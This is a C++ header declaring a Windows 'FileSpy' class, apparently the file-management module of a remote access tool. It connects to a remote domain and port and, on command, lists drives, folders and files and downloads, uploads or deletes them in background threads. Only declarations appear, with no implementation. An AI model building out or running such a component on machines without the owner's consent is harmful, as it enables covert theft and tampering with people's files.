#ifndef FILESPY_H
#define FILESPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <map>
#include <vector>

class FileSpy
{
public:
    FileSpy();

     std::string CmdGetDirFiles;
     std::string CmdDownloadFile;
     std::string CmdUploadFile;
     std::string CmdDeleteFile;

     std::string CmdSendDrives;
     std::string CmdSendDirs;
     std::string CmdSendFiles;
     std::string CmdDeleteFileSuccess;
     std::string CmdDeleteFileFailed;

     std::string CmdSplit;
     std::string CmdEnd;
     std::string CmdFileSplit;

    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI fileSpyThreadProc(LPVOID args);
    static void startFileSpy(std::string domain, int port);

    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);
    static std::map<std::string, std::string> parseArgs(std::string &data);
    static void processCmd(TcpSocket *sock, std::string &cmd, std::string &data);

    static void doGetDirFiles(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doDownloadFile(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doUploadFile(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doDeleteFile(TcpSocket *sock, std::map<std::string, std::string> &args);

    static std::vector<std::string> getDrives();
    static std::vector<std::string> getDirs(std::string dir);
    static std::vector<std::string> getFiles(std::string dir);

    typedef struct {
        char fileName[256];
        unsigned int len;
    } FileHeader;

    static void startSendFileByNewThread(std::string filePath, std::string domain, int port);
    static DWORD WINAPI sendFileThreadProc(LPVOID args);
    static void startSendFile(std::string filePath, std::string domain, int port);

    static void startRecvFileByNewThread(std::string filePath, std::string domain, int port);
    static DWORD WINAPI recvFileThreadProc(LPVOID args);
    static void startRecvFile(std::string filePath, std::string domain, int port);
};

#endif // FILESPY_H
